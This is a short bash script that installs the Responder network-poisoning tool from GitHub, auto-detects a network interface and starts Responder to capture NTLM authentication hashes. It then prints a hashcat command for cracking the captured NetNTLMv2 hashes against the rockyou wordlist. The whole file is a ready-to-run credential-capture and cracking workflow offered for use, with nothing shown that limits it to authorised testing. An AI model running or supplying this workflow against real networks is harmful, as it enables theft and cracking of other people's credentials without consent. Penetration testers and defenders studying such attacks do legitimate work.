#!/bin/bash
# Setup and start Responder for NTLM capture
# Usage: ./setup_responder.sh [interface]

set -e

INTERFACE="${1:-auto}"

echo "[*] Setting up Responder for NTLM capture"

# Check if Responder is installed
if ! command -v responder &> /dev/null; then
    echo "[!] Responder not found. Installing..."
    
    if [ -d "/opt/responder" ]; then
        echo "[!] Responder directory exists but binary not in PATH"
        echo "[+] Try: export PATH=\$PATH:/opt/responder"
    else
        echo "[+] Cloning Responder..."
        git clone https://github.com/lgandx/Responder.git /opt/responder
        cd /opt/responder
        pip3 install -r requirements.txt
        echo "[+] Responder installed to /opt/responder"
        echo "[+] Add to PATH: export PATH=\$PATH:/opt/responder"
    fi
    exit 1
fi

# Determine interface
if [ "$INTERFACE" = "auto" ]; then
    # Try to find the best interface
    if command -v ip &> /dev/null; then
        INTERFACE=$(ip route | grep default | awk '{print $5}' | head -1)
    elif command -v ifconfig &> /dev/null; then
        INTERFACE=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $1}' | head -1)
    fi
    
    if [ -z "$INTERFACE" ]; then
        echo "[!] Could not auto-detect interface. Please specify: $0 <interface>"
        exit 1
    fi
fi

echo "[*] Using interface: $INTERFACE"

# Create output directory for captured hashes
mkdir -p /tmp/ntlm_captures
echo "[*] Captured hashes will be saved to /tmp/ntlm_captures/"

# Start Responder
echo ""
echo "[+] Starting Responder..."
echo "[+] Press Ctrl+C to stop"
echo ""
echo "[+] Captured hashes will appear in:"
echo "    - /opt/responder/logs/"
echo "    - /opt/responder/logs/hashes.txt (NetNTLMv2)"
echo ""
echo "[+] To crack captured hashes:"
echo "    hashcat -m 5600 /opt/responder/logs/hashes.txt rockyou.txt"
echo ""

# Run Responder
responder -I "$INTERFACE" -wcfv
